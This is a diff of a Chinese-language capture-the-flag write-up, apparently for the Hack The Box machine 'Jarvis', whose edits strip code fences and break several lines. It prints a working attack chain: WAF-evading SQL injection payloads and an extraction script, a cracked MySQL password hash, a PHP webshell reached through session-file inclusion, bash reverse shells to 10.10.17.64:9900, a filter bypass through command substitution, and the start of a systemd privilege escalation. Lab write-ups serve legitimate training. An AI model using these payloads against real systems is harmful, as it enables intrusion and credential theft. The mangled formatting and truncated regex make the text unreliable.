@@ -25,12 +25,9 @@ PORT      STATE SERVICE VERSION
 |_  Supported Methods: HEAD GET POST OPTIONS
 |_http-server-header: Apache/2.4.25 (Debian)
 |_http-title: Site doesn't have a title (text/html).
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-```
-
-
-
-```
+Service Info: OS: Linux; CPE: cpe:/o:
+linux:
+linux_kernel
 00       68l      167w     2237c http://supersecurehotel.htb/footer.php
 200      543l     1653w        0c http://supersecurehotel.htb/index.php
 200       43l       85w     1333c http://supersecurehotel.htb/nav.php
@@ -46,11 +43,6 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 200      216l      728w        0c http://supersecurehotel.htb/phpmyadmin/license.php
 200      216l      728w        0c http://supersecurehotel.htb/phpmyadmin/logout.php
 200      216l      728w        0c http://supersecurehotel.htb/phpmyadmin/navigation.php
-```
-
-
-
-```
 HTTP/1.1 200 OK
 Date: Sat, 27 Nov 2021 03:56:21 GMT
 Server: Apache/2.4.25 (Debian)
@@ -62,34 +54,14 @@ IronWAF: 2.0.3
 Content-Length: 23628
 Connection: close
 Content-Type: text/html; charset=UTF-8
-```
-
-
-
-```
 select cod_id,room_id,room_price from room where cod_id=<传递的cod参数>
-```
-
-
-
-```
 # 判断注入点到的查询 SQL 字段为 7 列
 GET /room.php?cod=2/**/order/**/by/**/8%23/**/    false
 GET /room.php?cod=2/**/order/**/by/**/7%23/**/    true
 
 # 使用连接查询替换真实数据，寻找子查询信息输出位置
 GET /room.php?cod=-1/**/union/**/select/**/1,2,3,4,5,6,7%23/**/ true
-```
-
-
-
-```
 cod: 1/**/And/**/3385/**/beTwEen/**/3385/**/And/**/3385--/**/phfx
-```
-
-
-
-```
 #!/bin/python3
 # -*- coding: UTF-8 -*-
 
@@ -109,15 +81,10 @@ if r.status_code != 200:
     print('Error')
     exit()
 
-reg_arr = re.findall(r'class="price-room">(.*)</span>',r.text)
+reg_arr = re.findall(r'class="price-room">(.*)',r.text)
 print('-'*20)
 print(reg_arr[0])
 print('-'*20)
-```
-
-
-
-```
 # 获取所有数据库名称
 send payload: select group_concat(schema_name) from information_schema.schemata
 --------------------
@@ -133,24 +100,16 @@ room
 # 获取mysql账户密码
 send payload: select concat(host,0x3a,user,0x3a,password) from mysql.user
 --------------------
-localhost:DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
+localhost:
+DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
 --------------------
 
 # 使用 hashcat 配合字典成功得到明文密码
-*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0:imissyou
-```
-
-
-
-```
+*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0:
+imissyou
 php：select '<?php system("bash -c 'sh -i >& /dev/tcp/10.10.17.64/9900 0>&1'"); ?>'
 
 payload：/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_xxxxxxx
-```
-
-
-
-```
 $ sudo -l
 Matching Defaults entries for www-data on jarvis:
     env_reset, mail_badpass,
@@ -159,11 +118,6 @@ Matching Defaults entries for www-data on jarvis:
 User www-data may run the following commands on jarvis:
     (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
 www-data@jarvis:/home/pepper$
-```
-
-
-
-```
 ...snip...
 def exec_ping():
     forbidden = ['&', ';', '-', '`', '||', '|']
@@ -183,28 +137,13 @@ if __name__ == '__main__':
     else:
         show_help()
         exit()
-```
-
-
-
-```
 $ echo 123`pwd`
 123/tmp
 
 $ echo 123$(pwd)
 123/tmp
-```
-
-
-
-```
 echo -e '#!/bin/bashnnbash -c "sh -i >& /dev/tcp/10.10.17.64/9900 0>&1"' > /tmp/shell
 chmod +x /tmp/shell
-```
-
-
-
-```
 TF=$(mktemp).service
 echo '[Service]
 Type=oneshot
